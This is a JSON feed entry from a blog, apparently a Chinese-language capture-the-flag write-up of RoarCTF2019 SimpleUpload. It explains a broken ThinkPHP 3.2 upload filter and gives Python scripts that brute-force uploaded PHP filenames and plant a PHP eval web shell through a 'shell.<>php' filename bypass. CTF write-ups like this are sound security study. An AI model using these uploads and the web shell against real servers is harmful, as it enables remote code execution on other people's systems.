@@ -1,0 +1,19 @@
+{
+    "version": "https://jsonfeed.org/version/1",
+    "title": "Hexo • All posts by \"thinkphp3.2.4\" tag",
+    "description": "",
+    "home_page_url": "http://odiws.github.io",
+    "items": [
+        {
+            "id": "http://odiws.github.io/2024/09/22/RoarCTF2019-SimpleUpload/",
+            "url": "http://odiws.github.io/2024/09/22/RoarCTF2019-SimpleUpload/",
+            "title": "[RoarCTF2019]SimpleUpload",
+            "date_published": "2024-09-22T12:06:00.000Z",
+            "content_html": "<h2 id=\"roarctf2019simpleupload\"><a class=\"markdownIt-Anchor\" href=\"#roarctf2019simpleupload\">#</a> [RoarCTF2019]SimpleUpload</h2>\n<p>推荐链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbmFuYi5naXRodWIuaW8vMjAyMS8wOS8xNS9Sb2FyQ1RGLTIwMTktU2ltcGxlLVVwbG9hZC8=\">https://inanb.github.io/2021/09/15/RoarCTF-2019-Simple-Upload/</span></p>\n<p>源码：</p>\n<pre><code> &lt;?php\nnamespace Home\\Controller;\n\nuse Think\\Controller;\n\nclass IndexController extends Controller\n&#123;\n    public function index()\n    &#123;\n        show_source(__FILE__);\n    &#125;\n    public function upload()\n    &#123;\n        $uploadFile = $_FILES['file'] ;\n        \n        if (strstr(strtolower($uploadFile['name']), &quot;.php&quot;) ) &#123;\n            return false;\n        &#125;\n        \n        $upload = new \\Think\\Upload();// 实例化上传类\n        $upload-&gt;maxSize  = 4096 ;// 设置附件上传大小\n        $upload-&gt;allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型\n        $upload-&gt;rootPath = './Public/Uploads/';// 设置附件上传目录\n        $upload-&gt;savePath = '';// 设置附件上传子目录\n        $info = $upload-&gt;upload() ;\n        if(!$info) &#123;// 上传错误提示错误信息\n          $this-&gt;error($upload-&gt;getError());\n          return;\n        &#125;else&#123;// 上传成功 获取上传文件信息\n          $url = __ROOT__.substr($upload-&gt;rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;\n          echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1));\n        &#125;\n    &#125;\n&#125; \n</code></pre>\n<p>知识点：</p>\n<p>tp 默认上传目录：index.php/home/index/upload</p>\n<p>tp 支持多个文件上传</p>\n<p>tp 的文件上传用法这里不对，限定后缀应为 $upload-&gt;exts，所以文件名过滤无效</p>\n<p>tp 上传默认命名方式受时间戳控制，所以时间间隔很短的上传文件名会大致一样</p>\n<p>解题方法：</p>\n<p>题目中会打印出来上传成功的不以.php 结尾的文件名，通过同时上传多个文件的方法拿到 php 两侧文件的文件名，然后根据不一样的位数爆破 php 文件名</p>\n<pre><code>import requests\n#from io import BytesIO\n\nurl=&quot;http://cf4a0675-7522-4210-bbdf-0492504324b3.node4.buuoj.cn:81/index.php/home/index/upload&quot;\n\nfiles1 = &#123;'file': open('1.txt','r')&#125;\nfiles2 = &#123;'file[]': open('1.php','r')&#125;\n\nr = requests.post(url,files=files1)\nprint(r.text)\n\nr = requests.post(url,files=files2)\nprint(r.text)\n\nr = requests.post(url,files=files1)\nprint(r.text)\n</code></pre>\n<p>其他方法：直接上传 xxx.&lt;&gt;php 即可直接拿到文件名</p>\n<p>其他方法：</p>\n<pre><code>import requests\nurl = &quot;http://83a80334-cdce-4f32-af7b-18f7d54b565f.node5.buuoj.cn:81/index.php/home/index/upload/&quot;\ns = requests.Session()\nfiles = &#123;&quot;file&quot;: (&quot;shell.&lt;&gt;php&quot;, &quot;&lt;?php eval($_GET['cmd'])?&gt;&quot;)&#125;\nr = requests.post(url, files=files)\nprint(r.text)\n</code></pre>\n",
+            "tags": [
+                "buuctf",
+                "thinkphp3.2.4"
+            ]
+        }
+    ]
+}
